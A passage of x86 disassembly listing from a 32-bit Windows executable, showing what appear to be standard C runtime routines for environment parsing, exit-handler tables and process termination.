  4031b8:	83 cf ff             	or     $0xffffffff,%edi
  4031bb:	eb 2a                	jmp    0x4031e7
  4031bd:	56                   	push   %esi
  4031be:	e8 30 00 00 00       	call   0x4031f3
  4031c3:	59                   	pop    %ecx
  4031c4:	85 c0                	test   %eax,%eax
  4031c6:	75 05                	jne    0x4031cd
  4031c8:	83 cf ff             	or     $0xffffffff,%edi
  4031cb:	eb 12                	jmp    0x4031df
  4031cd:	50                   	push   %eax
  4031ce:	b9 b8 3d 41 00       	mov    $0x413db8,%ecx
  4031d3:	a3 bc 3d 41 00       	mov    %eax,0x413dbc
  4031d8:	e8 16 37 00 00       	call   0x4068f3
  4031dd:	33 ff                	xor    %edi,%edi
  4031df:	6a 00                	push   $0x0
  4031e1:	e8 27 0c 00 00       	call   0x403e0d
  4031e6:	59                   	pop    %ecx
  4031e7:	56                   	push   %esi
  4031e8:	e8 20 0c 00 00       	call   0x403e0d
  4031ed:	59                   	pop    %ecx
  4031ee:	8b c7                	mov    %edi,%eax
  4031f0:	5f                   	pop    %edi
  4031f1:	5e                   	pop    %esi
  4031f2:	c3                   	ret
  4031f3:	8b ff                	mov    %edi,%edi
  4031f5:	55                   	push   %ebp
  4031f6:	8b ec                	mov    %esp,%ebp
  4031f8:	51                   	push   %ecx
  4031f9:	51                   	push   %ecx
  4031fa:	53                   	push   %ebx
  4031fb:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4031fe:	33 c0                	xor    %eax,%eax
  403200:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403203:	8b d0                	mov    %eax,%edx
  403205:	56                   	push   %esi
  403206:	57                   	push   %edi
  403207:	0f b7 03             	movzwl (%ebx),%eax
  40320a:	8b f3                	mov    %ebx,%esi
  40320c:	66 85 c0             	test   %ax,%ax
  40320f:	74 2f                	je     0x403240
  403211:	6a 3d                	push   $0x3d
  403213:	5b                   	pop    %ebx
  403214:	66 3b c3             	cmp    %bx,%ax
  403217:	74 01                	je     0x40321a
  403219:	42                   	inc    %edx
  40321a:	8b ce                	mov    %esi,%ecx
  40321c:	8d 79 02             	lea    0x2(%ecx),%edi
  40321f:	66 8b 01             	mov    (%ecx),%ax
  403222:	83 c1 02             	add    $0x2,%ecx
  403225:	66 3b 45 f8          	cmp    -0x8(%ebp),%ax
  403229:	75 f4                	jne    0x40321f
  40322b:	2b cf                	sub    %edi,%ecx
  40322d:	d1 f9                	sar    $1,%ecx
  40322f:	8d 34 4e             	lea    (%esi,%ecx,2),%esi
  403232:	83 c6 02             	add    $0x2,%esi
  403235:	0f b7 06             	movzwl (%esi),%eax
  403238:	66 85 c0             	test   %ax,%ax
  40323b:	75 d7                	jne    0x403214
  40323d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403240:	8d 42 01             	lea    0x1(%edx),%eax
  403243:	6a 04                	push   $0x4
  403245:	50                   	push   %eax
  403246:	e8 8d 0c 00 00       	call   0x403ed8
  40324b:	8b f8                	mov    %eax,%edi
  40324d:	33 f6                	xor    %esi,%esi
  40324f:	59                   	pop    %ecx
  403250:	59                   	pop    %ecx
  403251:	85 ff                	test   %edi,%edi
  403253:	74 79                	je     0x4032ce
  403255:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403258:	eb 5d                	jmp    0x4032b7
  40325a:	8b cb                	mov    %ebx,%ecx
  40325c:	8d 51 02             	lea    0x2(%ecx),%edx
  40325f:	66 8b 01             	mov    (%ecx),%ax
  403262:	83 c1 02             	add    $0x2,%ecx
  403265:	66 3b c6             	cmp    %si,%ax
  403268:	75 f5                	jne    0x40325f
  40326a:	2b ca                	sub    %edx,%ecx
  40326c:	d1 f9                	sar    $1,%ecx
  40326e:	6a 3d                	push   $0x3d
  403270:	8d 41 01             	lea    0x1(%ecx),%eax
  403273:	59                   	pop    %ecx
  403274:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403277:	66 39 0b             	cmp    %cx,(%ebx)
  40327a:	74 38                	je     0x4032b4
  40327c:	6a 02                	push   $0x2
  40327e:	50                   	push   %eax
  40327f:	e8 54 0c 00 00       	call   0x403ed8
  403284:	8b f0                	mov    %eax,%esi
  403286:	59                   	pop    %ecx
  403287:	59                   	pop    %ecx
  403288:	85 f6                	test   %esi,%esi
  40328a:	74 32                	je     0x4032be
  40328c:	53                   	push   %ebx
  40328d:	ff 75 f8             	push   -0x8(%ebp)
  403290:	56                   	push   %esi
  403291:	e8 f0 13 00 00       	call   0x404686
  403296:	83 c4 0c             	add    $0xc,%esp
  403299:	85 c0                	test   %eax,%eax
  40329b:	75 43                	jne    0x4032e0
  40329d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4032a0:	89 30                	mov    %esi,(%eax)
  4032a2:	33 f6                	xor    %esi,%esi
  4032a4:	83 c0 04             	add    $0x4,%eax
  4032a7:	56                   	push   %esi
  4032a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4032ab:	e8 5d 0b 00 00       	call   0x403e0d
  4032b0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4032b3:	59                   	pop    %ecx
  4032b4:	8d 1c 43             	lea    (%ebx,%eax,2),%ebx
  4032b7:	66 39 33             	cmp    %si,(%ebx)
  4032ba:	75 9e                	jne    0x40325a
  4032bc:	eb 12                	jmp    0x4032d0
  4032be:	57                   	push   %edi
  4032bf:	e8 29 00 00 00       	call   0x4032ed
  4032c4:	33 f6                	xor    %esi,%esi
  4032c6:	56                   	push   %esi
  4032c7:	e8 41 0b 00 00       	call   0x403e0d
  4032cc:	59                   	pop    %ecx
  4032cd:	59                   	pop    %ecx
  4032ce:	8b fe                	mov    %esi,%edi
  4032d0:	56                   	push   %esi
  4032d1:	e8 37 0b 00 00       	call   0x403e0d
  4032d6:	59                   	pop    %ecx
  4032d7:	8b c7                	mov    %edi,%eax
  4032d9:	5f                   	pop    %edi
  4032da:	5e                   	pop    %esi
  4032db:	5b                   	pop    %ebx
  4032dc:	8b e5                	mov    %ebp,%esp
  4032de:	5d                   	pop    %ebp
  4032df:	c3                   	ret
  4032e0:	33 c0                	xor    %eax,%eax
  4032e2:	50                   	push   %eax
  4032e3:	50                   	push   %eax
  4032e4:	50                   	push   %eax
  4032e5:	50                   	push   %eax
  4032e6:	50                   	push   %eax
  4032e7:	e8 67 13 00 00       	call   0x404653
  4032ec:	cc                   	int3
  4032ed:	8b ff                	mov    %edi,%edi
  4032ef:	55                   	push   %ebp
  4032f0:	8b ec                	mov    %esp,%ebp
  4032f2:	56                   	push   %esi
  4032f3:	8b 75 08             	mov    0x8(%ebp),%esi
  4032f6:	85 f6                	test   %esi,%esi
  4032f8:	74 1f                	je     0x403319
  4032fa:	8b 06                	mov    (%esi),%eax
  4032fc:	57                   	push   %edi
  4032fd:	8b fe                	mov    %esi,%edi
  4032ff:	eb 0c                	jmp    0x40330d
  403301:	50                   	push   %eax
  403302:	e8 06 0b 00 00       	call   0x403e0d
  403307:	8d 7f 04             	lea    0x4(%edi),%edi
  40330a:	8b 07                	mov    (%edi),%eax
  40330c:	59                   	pop    %ecx
  40330d:	85 c0                	test   %eax,%eax
  40330f:	75 f0                	jne    0x403301
  403311:	56                   	push   %esi
  403312:	e8 f6 0a 00 00       	call   0x403e0d
  403317:	59                   	pop    %ecx
  403318:	5f                   	pop    %edi
  403319:	5e                   	pop    %esi
  40331a:	5d                   	pop    %ebp
  40331b:	c3                   	ret
  40331c:	8b ff                	mov    %edi,%edi
  40331e:	55                   	push   %ebp
  40331f:	8b ec                	mov    %esp,%ebp
  403321:	51                   	push   %ecx
  403322:	a1 04 30 41 00       	mov    0x413004,%eax
  403327:	33 c5                	xor    %ebp,%eax
  403329:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40332c:	56                   	push   %esi
  40332d:	8b f1                	mov    %ecx,%esi
  40332f:	57                   	push   %edi
  403330:	8d 7e 04             	lea    0x4(%esi),%edi
  403333:	eb 11                	jmp    0x403346
  403335:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403338:	56                   	push   %esi
  403339:	ff 15 60 c1 40 00    	call   *0x40c160
  40333f:	ff 55 08             	call   *0x8(%ebp)
  403342:	59                   	pop    %ecx
  403343:	83 c6 04             	add    $0x4,%esi
  403346:	3b f7                	cmp    %edi,%esi
  403348:	75 eb                	jne    0x403335
  40334a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40334d:	5f                   	pop    %edi
  40334e:	33 cd                	xor    %ebp,%ecx
  403350:	5e                   	pop    %esi
  403351:	e8 72 e4 ff ff       	call   0x4017c8
  403356:	8b e5                	mov    %ebp,%esp
  403358:	5d                   	pop    %ebp
  403359:	c2 04 00             	ret    $0x4
  40335c:	8b ff                	mov    %edi,%edi
  40335e:	55                   	push   %ebp
  40335f:	8b ec                	mov    %esp,%ebp
  403361:	8b 45 08             	mov    0x8(%ebp),%eax
  403364:	8b 00                	mov    (%eax),%eax
  403366:	3b 05 c0 3d 41 00    	cmp    0x413dc0,%eax
  40336c:	74 07                	je     0x403375
  40336e:	50                   	push   %eax
  40336f:	e8 79 ff ff ff       	call   0x4032ed
  403374:	59                   	pop    %ecx
  403375:	5d                   	pop    %ebp
  403376:	c3                   	ret
  403377:	8b ff                	mov    %edi,%edi
  403379:	55                   	push   %ebp
  40337a:	8b ec                	mov    %esp,%ebp
  40337c:	8b 45 08             	mov    0x8(%ebp),%eax
  40337f:	8b 00                	mov    (%eax),%eax
  403381:	3b 05 bc 3d 41 00    	cmp    0x413dbc,%eax
  403387:	74 07                	je     0x403390
  403389:	50                   	push   %eax
  40338a:	e8 5e ff ff ff       	call   0x4032ed
  40338f:	59                   	pop    %ecx
  403390:	5d                   	pop    %ebp
  403391:	c3                   	ret
  403392:	68 5c 33 40 00       	push   $0x40335c
  403397:	b9 b4 3d 41 00       	mov    $0x413db4,%ecx
  40339c:	e8 7b ff ff ff       	call   0x40331c
  4033a1:	68 77 33 40 00       	push   $0x403377
  4033a6:	b9 b8 3d 41 00       	mov    $0x413db8,%ecx
  4033ab:	e8 6c ff ff ff       	call   0x40331c
  4033b0:	ff 35 c0 3d 41 00    	push   0x413dc0
  4033b6:	e8 32 ff ff ff       	call   0x4032ed
  4033bb:	ff 35 bc 3d 41 00    	push   0x413dbc
  4033c1:	e8 27 ff ff ff       	call   0x4032ed
  4033c6:	59                   	pop    %ecx
  4033c7:	59                   	pop    %ecx
  4033c8:	c3                   	ret
  4033c9:	e9 d1 fd ff ff       	jmp    0x40319f
  4033ce:	a1 2c 3e 41 00       	mov    0x413e2c,%eax
  4033d3:	85 c0                	test   %eax,%eax
  4033d5:	75 05                	jne    0x4033dc
  4033d7:	b8 c4 3d 41 00       	mov    $0x413dc4,%eax
  4033dc:	56                   	push   %esi
  4033dd:	6a 20                	push   $0x20
  4033df:	32 d2                	xor    %dl,%dl
  4033e1:	5e                   	pop    %esi
  4033e2:	0f b7 08             	movzwl (%eax),%ecx
  4033e5:	66 3b ce             	cmp    %si,%cx
  4033e8:	77 09                	ja     0x4033f3
  4033ea:	66 85 c9             	test   %cx,%cx
  4033ed:	74 23                	je     0x403412
  4033ef:	84 d2                	test   %dl,%dl
  4033f1:	74 17                	je     0x40340a
  4033f3:	83 f9 22             	cmp    $0x22,%ecx
  4033f6:	75 05                	jne    0x4033fd
  4033f8:	84 d2                	test   %dl,%dl
  4033fa:	0f 94 c2             	sete   %dl
  4033fd:	83 c0 02             	add    $0x2,%eax
  403400:	eb e0                	jmp    0x4033e2
  403402:	66 3b ce             	cmp    %si,%cx
  403405:	77 0b                	ja     0x403412
  403407:	83 c0 02             	add    $0x2,%eax
  40340a:	0f b7 08             	movzwl (%eax),%ecx
  40340d:	66 85 c9             	test   %cx,%cx
  403410:	75 f0                	jne    0x403402
  403412:	5e                   	pop    %esi
  403413:	c3                   	ret
  403414:	8b ff                	mov    %edi,%edi
  403416:	55                   	push   %ebp
  403417:	8b ec                	mov    %esp,%ebp
  403419:	51                   	push   %ecx
  40341a:	51                   	push   %ecx
  40341b:	a1 04 30 41 00       	mov    0x413004,%eax
  403420:	33 c5                	xor    %ebp,%eax
  403422:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403425:	8b 45 0c             	mov    0xc(%ebp),%eax
  403428:	53                   	push   %ebx
  403429:	56                   	push   %esi
  40342a:	8b 75 08             	mov    0x8(%ebp),%esi
  40342d:	2b c6                	sub    %esi,%eax
  40342f:	83 c0 03             	add    $0x3,%eax
  403432:	57                   	push   %edi
  403433:	33 ff                	xor    %edi,%edi
  403435:	c1 e8 02             	shr    $0x2,%eax
  403438:	39 75 0c             	cmp    %esi,0xc(%ebp)
  40343b:	1b db                	sbb    %ebx,%ebx
  40343d:	f7 d3                	not    %ebx
  40343f:	23 d8                	and    %eax,%ebx
  403441:	74 1c                	je     0x40345f
  403443:	8b 06                	mov    (%esi),%eax
  403445:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403448:	85 c0                	test   %eax,%eax
  40344a:	74 0b                	je     0x403457
  40344c:	8b c8                	mov    %eax,%ecx
  40344e:	ff 15 60 c1 40 00    	call   *0x40c160
  403454:	ff 55 f8             	call   *-0x8(%ebp)
  403457:	83 c6 04             	add    $0x4,%esi
  40345a:	47                   	inc    %edi
  40345b:	3b fb                	cmp    %ebx,%edi
  40345d:	75 e4                	jne    0x403443
  40345f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403462:	5f                   	pop    %edi
  403463:	5e                   	pop    %esi
  403464:	33 cd                	xor    %ebp,%ecx
  403466:	5b                   	pop    %ebx
  403467:	e8 5c e3 ff ff       	call   0x4017c8
  40346c:	8b e5                	mov    %ebp,%esp
  40346e:	5d                   	pop    %ebp
  40346f:	c3                   	ret
  403470:	8b ff                	mov    %edi,%edi
  403472:	55                   	push   %ebp
  403473:	8b ec                	mov    %esp,%ebp
  403475:	51                   	push   %ecx
  403476:	a1 04 30 41 00       	mov    0x413004,%eax
  40347b:	33 c5                	xor    %ebp,%eax
  40347d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403480:	56                   	push   %esi
  403481:	8b 75 08             	mov    0x8(%ebp),%esi
  403484:	57                   	push   %edi
  403485:	eb 17                	jmp    0x40349e
  403487:	8b 3e                	mov    (%esi),%edi
  403489:	85 ff                	test   %edi,%edi
  40348b:	74 0e                	je     0x40349b
  40348d:	8b cf                	mov    %edi,%ecx
  40348f:	ff 15 60 c1 40 00    	call   *0x40c160
  403495:	ff d7                	call   *%edi
  403497:	85 c0                	test   %eax,%eax
  403499:	75 0a                	jne    0x4034a5
  40349b:	83 c6 04             	add    $0x4,%esi
  40349e:	3b 75 0c             	cmp    0xc(%ebp),%esi
  4034a1:	75 e4                	jne    0x403487
  4034a3:	33 c0                	xor    %eax,%eax
  4034a5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4034a8:	5f                   	pop    %edi
  4034a9:	33 cd                	xor    %ebp,%ecx
  4034ab:	5e                   	pop    %esi
  4034ac:	e8 17 e3 ff ff       	call   0x4017c8
  4034b1:	8b e5                	mov    %ebp,%esp
  4034b3:	5d                   	pop    %ebp
  4034b4:	c3                   	ret
  4034b5:	8b ff                	mov    %edi,%edi
  4034b7:	55                   	push   %ebp
  4034b8:	8b ec                	mov    %esp,%ebp
  4034ba:	33 c0                	xor    %eax,%eax
  4034bc:	81 7d 08 63 73 6d e0 	cmpl   $0xe06d7363,0x8(%ebp)
  4034c3:	0f 94 c0             	sete   %al
  4034c6:	5d                   	pop    %ebp
  4034c7:	c3                   	ret
  4034c8:	6a 0c                	push   $0xc
  4034ca:	68 20 17 41 00       	push   $0x411720
  4034cf:	e8 dc 75 00 00       	call   0x40aab0
  4034d4:	8b 75 10             	mov    0x10(%ebp),%esi
  4034d7:	85 f6                	test   %esi,%esi
  4034d9:	75 12                	jne    0x4034ed
  4034db:	e8 37 eb ff ff       	call   0x402017
  4034e0:	84 c0                	test   %al,%al
  4034e2:	74 09                	je     0x4034ed
  4034e4:	ff 75 08             	push   0x8(%ebp)
  4034e7:	e8 36 01 00 00       	call   0x403622
  4034ec:	59                   	pop    %ecx
  4034ed:	6a 02                	push   $0x2
  4034ef:	e8 6c 21 00 00       	call   0x405660
  4034f4:	59                   	pop    %ecx
  4034f5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4034f9:	80 3d d0 3d 41 00 00 	cmpb   $0x0,0x413dd0
  403500:	0f 85 99 00 00 00    	jne    0x40359f
  403506:	33 c0                	xor    %eax,%eax
  403508:	40                   	inc    %eax
  403509:	b9 c8 3d 41 00       	mov    $0x413dc8,%ecx
  40350e:	87 01                	xchg   %eax,(%ecx)
  403510:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403517:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40351a:	85 ff                	test   %edi,%edi
  40351c:	75 3c                	jne    0x40355a
  40351e:	8b 1d 04 30 41 00    	mov    0x413004,%ebx
  403524:	8b d3                	mov    %ebx,%edx
  403526:	83 e2 1f             	and    $0x1f,%edx
  403529:	6a 20                	push   $0x20
  40352b:	59                   	pop    %ecx
  40352c:	2b ca                	sub    %edx,%ecx
  40352e:	33 c0                	xor    %eax,%eax
  403530:	d3 c8                	ror    %cl,%eax
  403532:	33 c3                	xor    %ebx,%eax
  403534:	8b 0d cc 3d 41 00    	mov    0x413dcc,%ecx
  40353a:	3b c8                	cmp    %eax,%ecx
  40353c:	74 15                	je     0x403553
  40353e:	33 d9                	xor    %ecx,%ebx
  403540:	33 c0                	xor    %eax,%eax
  403542:	50                   	push   %eax
  403543:	50                   	push   %eax
  403544:	50                   	push   %eax
  403545:	8b ca                	mov    %edx,%ecx
  403547:	d3 cb                	ror    %cl,%ebx
  403549:	8b cb                	mov    %ebx,%ecx
  40354b:	ff 15 60 c1 40 00    	call   *0x40c160
  403551:	ff d3                	call   *%ebx
  403553:	68 e0 3d 41 00       	push   $0x413de0
  403558:	eb 0a                	jmp    0x403564
  40355a:	83 ff 01             	cmp    $0x1,%edi
  40355d:	75 0b                	jne    0x40356a
  40355f:	68 ec 3d 41 00       	push   $0x413dec
  403564:	e8 73 06 00 00       	call   0x403bdc
  403569:	59                   	pop    %ecx
  40356a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40356e:	85 ff                	test   %edi,%edi
  403570:	75 11                	jne    0x403583
  403572:	68 9c c1 40 00       	push   $0x40c19c
  403577:	68 8c c1 40 00       	push   $0x40c18c
  40357c:	e8 93 fe ff ff       	call   0x403414
  403581:	59                   	pop    %ecx
  403582:	59                   	pop    %ecx
  403583:	68 a4 c1 40 00       	push   $0x40c1a4
  403588:	68 a0 c1 40 00       	push   $0x40c1a0
  40358d:	e8 82 fe ff ff       	call   0x403414
  403592:	59                   	pop    %ecx
  403593:	59                   	pop    %ecx
  403594:	85 f6                	test   %esi,%esi
  403596:	75 07                	jne    0x40359f
  403598:	c6 05 d0 3d 41 00 01 	movb   $0x1,0x413dd0
  40359f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4035a6:	e8 27 00 00 00       	call   0x4035d2
  4035ab:	85 f6                	test   %esi,%esi
  4035ad:	75 2c                	jne    0x4035db
  4035af:	ff 75 08             	push   0x8(%ebp)
  4035b2:	e8 2a 00 00 00       	call   0x4035e1
  4035b7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4035ba:	8b 00                	mov    (%eax),%eax
  4035bc:	ff 30                	push   (%eax)
  4035be:	e8 f2 fe ff ff       	call   0x4034b5
  4035c3:	83 c4 04             	add    $0x4,%esp
  4035c6:	c3                   	ret
  4035c7:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4035ca:	e8 02 08 00 00       	call   0x403dd1
  4035cf:	8b 75 10             	mov    0x10(%ebp),%esi
  4035d2:	6a 02                	push   $0x2
  4035d4:	e8 cf 20 00 00       	call   0x4056a8
  4035d9:	59                   	pop    %ecx
  4035da:	c3                   	ret
  4035db:	e8 19 75 00 00       	call   0x40aaf9
  4035e0:	c3                   	ret
  4035e1:	8b ff                	mov    %edi,%edi
  4035e3:	55                   	push   %ebp
  4035e4:	8b ec                	mov    %esp,%ebp
  4035e6:	e8 b2 24 00 00       	call   0x405a9d
  4035eb:	84 c0                	test   %al,%al
  4035ed:	74 20                	je     0x40360f
  4035ef:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  4035f5:	8b 40 68             	mov    0x68(%eax),%eax
  4035f8:	c1 e8 08             	shr    $0x8,%eax
  4035fb:	a8 01                	test   $0x1,%al
  4035fd:	75 10                	jne    0x40360f
  4035ff:	ff 75 08             	push   0x8(%ebp)
  403602:	ff 15 2c c0 40 00    	call   *0x40c02c
  403608:	50                   	push   %eax
  403609:	ff 15 7c c0 40 00    	call   *0x40c07c
  40360f:	ff 75 08             	push   0x8(%ebp)
  403612:	e8 0b 00 00 00       	call   0x403622
  403617:	59                   	pop    %ecx
  403618:	ff 75 08             	push   0x8(%ebp)
  40361b:	ff 15 ec c0 40 00    	call   *0x40c0ec
  403621:	cc                   	int3
  403622:	8b ff                	mov    %edi,%edi
  403624:	55                   	push   %ebp
  403625:	8b ec                	mov    %esp,%ebp
  403627:	51                   	push   %ecx
  403628:	51                   	push   %ecx
  403629:	a1 04 30 41 00       	mov    0x413004,%eax
  40362e:	33 c5                	xor    %ebp,%eax
  403630:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403633:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403637:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40363a:	50                   	push   %eax
  40363b:	68 cc ca 40 00       	push   $0x40cacc
  403640:	6a 00                	push   $0x0
  403642:	ff 15 f0 c0 40 00    	call   *0x40c0f0
  403648:	85 c0                	test   %eax,%eax
  40364a:	74 23                	je     0x40366f
  40364c:	56                   	push   %esi
  40364d:	68 e4 ca 40 00       	push   $0x40cae4
  403652:	ff 75 f8             	push   -0x8(%ebp)
  403655:	ff 15 d4 c0 40 00    	call   *0x40c0d4
  40365b:	8b f0                	mov    %eax,%esi
  40365d:	85 f6                	test   %esi,%esi
  40365f:	74 0d                	je     0x40366e
  403661:	ff 75 08             	push   0x8(%ebp)
  403664:	8b ce                	mov    %esi,%ecx
  403666:	ff 15 60 c1 40 00    	call   *0x40c160
  40366c:	ff d6                	call   *%esi
  40366e:	5e                   	pop    %esi
  40366f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403673:	74 09                	je     0x40367e
  403675:	ff 75 f8             	push   -0x8(%ebp)
  403678:	ff 15 d0 c0 40 00    	call   *0x40c0d0
  40367e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403681:	33 cd                	xor    %ebp,%ecx
  403683:	e8 40 e1 ff ff       	call   0x4017c8
  403688:	8b e5                	mov    %ebp,%esp
  40368a:	5d                   	pop    %ebp
  40368b:	c3                   	ret
  40368c:	8b ff                	mov    %edi,%edi
  40368e:	55                   	push   %ebp
  40368f:	8b ec                	mov    %esp,%ebp
  403691:	8b 45 08             	mov    0x8(%ebp),%eax
  403694:	a3 cc 3d 41 00       	mov    %eax,0x413dcc
  403699:	5d                   	pop    %ebp
  40369a:	c3                   	ret
  40369b:	6a 01                	push   $0x1
  40369d:	6a 02                	push   $0x2
  40369f:	6a 00                	push   $0x0
  4036a1:	e8 22 fe ff ff       	call   0x4034c8
  4036a6:	83 c4 0c             	add    $0xc,%esp
  4036a9:	c3                   	ret
  4036aa:	6a 01                	push   $0x1
  4036ac:	6a 00                	push   $0x0
  4036ae:	6a 00                	push   $0x0
  4036b0:	e8 13 fe ff ff       	call   0x4034c8
  4036b5:	83 c4 0c             	add    $0xc,%esp
  4036b8:	c3                   	ret
  4036b9:	8b ff                	mov    %edi,%edi
  4036bb:	55                   	push   %ebp
  4036bc:	8b ec                	mov    %esp,%ebp
  4036be:	6a 00                	push   $0x0
  4036c0:	6a 02                	push   $0x2
  4036c2:	ff 75 08             	push   0x8(%ebp)
  4036c5:	e8 fe fd ff ff       	call   0x4034c8
  4036ca:	83 c4 0c             	add    $0xc,%esp
  4036cd:	5d                   	pop    %ebp
  4036ce:	c3                   	ret
  4036cf:	8b ff                	mov    %edi,%edi
  4036d1:	55                   	push   %ebp
  4036d2:	8b ec                	mov    %esp,%ebp
  4036d4:	a1 04 30 41 00       	mov    0x413004,%eax
  4036d9:	83 e0 1f             	and    $0x1f,%eax
  4036dc:	6a 20                	push   $0x20
  4036de:	59                   	pop    %ecx
  4036df:	2b c8                	sub    %eax,%ecx
  4036e1:	33 c0                	xor    %eax,%eax
  4036e3:	d3 c8                	ror    %cl,%eax
  4036e5:	33 05 04 30 41 00    	xor    0x413004,%eax
  4036eb:	39 05 cc 3d 41 00    	cmp    %eax,0x413dcc
  4036f1:	0f 85 da 06 00 00    	jne    0x403dd1
  4036f7:	ff 75 08             	push   0x8(%ebp)
  4036fa:	e8 47 02 00 00       	call   0x403946
  4036ff:	59                   	pop    %ecx
  403700:	a3 cc 3d 41 00       	mov    %eax,0x413dcc
  403705:	5d                   	pop    %ebp
  403706:	c3                   	ret
  403707:	8b ff                	mov    %edi,%edi
  403709:	55                   	push   %ebp
  40370a:	8b ec                	mov    %esp,%ebp
  40370c:	6a 00                	push   $0x0
  40370e:	6a 00                	push   $0x0
  403710:	ff 75 08             	push   0x8(%ebp)
  403713:	e8 b0 fd ff ff       	call   0x4034c8
  403718:	83 c4 0c             	add    $0xc,%esp
  40371b:	5d                   	pop    %ebp
  40371c:	c3                   	ret
  40371d:	8b ff                	mov    %edi,%edi
  40371f:	55                   	push   %ebp
  403720:	8b ec                	mov    %esp,%ebp
  403722:	8b 45 08             	mov    0x8(%ebp),%eax
  403725:	3d 00 40 00 00       	cmp    $0x4000,%eax
  40372a:	74 23                	je     0x40374f
  40372c:	3d 00 80 00 00       	cmp    $0x8000,%eax
  403731:	74 1c                	je     0x40374f
  403733:	3d 00 00 01 00       	cmp    $0x10000,%eax
  403738:	74 15                	je     0x40374f
  40373a:	e8 fc 10 00 00       	call   0x40483b
  40373f:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  403745:	e8 f9 0e 00 00       	call   0x404643
  40374a:	6a 16                	push   $0x16
  40374c:	58                   	pop    %eax
  40374d:	5d                   	pop    %ebp
  40374e:	c3                   	ret
  40374f:	b9 4c 40 41 00       	mov    $0x41404c,%ecx
  403754:	87 01                	xchg   %eax,(%ecx)
  403756:	33 c0                	xor    %eax,%eax
  403758:	5d                   	pop    %ebp
  403759:	c3                   	ret
  40375a:	33 c0                	xor    %eax,%eax
  40375c:	b9 d4 3d 41 00       	mov    $0x413dd4,%ecx
  403761:	40                   	inc    %eax
  403762:	87 01                	xchg   %eax,(%ecx)
  403764:	c3                   	ret
  403765:	6a 08                	push   $0x8
  403767:	68 48 17 41 00       	push   $0x411748
  40376c:	e8 9f e9 ff ff       	call   0x402110
  403771:	be 78 35 41 00       	mov    $0x413578,%esi
  403776:	39 35 54 42 41 00    	cmp    %esi,0x414254
  40377c:	74 2a                	je     0x4037a8
  40377e:	6a 04                	push   $0x4
  403780:	e8 db 1e 00 00       	call   0x405660
  403785:	59                   	pop    %ecx
  403786:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40378a:	56                   	push   %esi
  40378b:	68 54 42 41 00       	push   $0x414254
  403790:	e8 ab 2f 00 00       	call   0x406740
  403795:	59                   	pop    %ecx
  403796:	59                   	pop    %ecx
  403797:	a3 54 42 41 00       	mov    %eax,0x414254
  40379c:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4037a3:	e8 06 00 00 00       	call   0x4037ae
  4037a8:	e8 a9 e9 ff ff       	call   0x402156
  4037ad:	c3                   	ret
  4037ae:	6a 04                	push   $0x4
  4037b0:	e8 f3 1e 00 00       	call   0x4056a8
  4037b5:	59                   	pop    %ecx
  4037b6:	c3                   	ret
  4037b7:	8b ff                	mov    %edi,%edi
  4037b9:	55                   	push   %ebp
  4037ba:	8b ec                	mov    %esp,%ebp
  4037bc:	56                   	push   %esi
  4037bd:	e8 68 0b 00 00       	call   0x40432a
  4037c2:	8b 55 08             	mov    0x8(%ebp),%edx
  4037c5:	8b f0                	mov    %eax,%esi
  4037c7:	6a 00                	push   $0x0
  4037c9:	58                   	pop    %eax
  4037ca:	8b 8e 50 03 00 00    	mov    0x350(%esi),%ecx
  4037d0:	f6 c1 02             	test   $0x2,%cl
  4037d3:	0f 94 c0             	sete   %al
  4037d6:	40                   	inc    %eax
  4037d7:	83 fa ff             	cmp    $0xffffffff,%edx
  4037da:	74 33                	je     0x40380f
  4037dc:	85 d2                	test   %edx,%edx
  4037de:	74 36                	je     0x403816
  4037e0:	83 fa 01             	cmp    $0x1,%edx
  4037e3:	74 1f                	je     0x403804
  4037e5:	83 fa 02             	cmp    $0x2,%edx
  4037e8:	74 15                	je     0x4037ff
  4037ea:	e8 4c 10 00 00       	call   0x40483b
  4037ef:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4037f5:	e8 49 0e 00 00       	call   0x404643
  4037fa:	83 c8 ff             	or     $0xffffffff,%eax
  4037fd:	eb 17                	jmp    0x403816
  4037ff:	83 e1 fd             	and    $0xfffffffd,%ecx
  403802:	eb 03                	jmp    0x403807
  403804:	83 c9 02             	or     $0x2,%ecx
  403807:	89 8e 50 03 00 00    	mov    %ecx,0x350(%esi)
  40380d:	eb 07                	jmp    0x403816
  40380f:	83 0d 98 36 41 00 ff 	orl    $0xffffffff,0x413698
  403816:	5e                   	pop    %esi
  403817:	5d                   	pop    %ebp
  403818:	c3                   	ret
  403819:	a1 d8 3d 41 00       	mov    0x413dd8,%eax
  40381e:	c3                   	ret
  40381f:	8b ff                	mov    %edi,%edi
  403821:	55                   	push   %ebp
  403822:	8b ec                	mov    %esp,%ebp
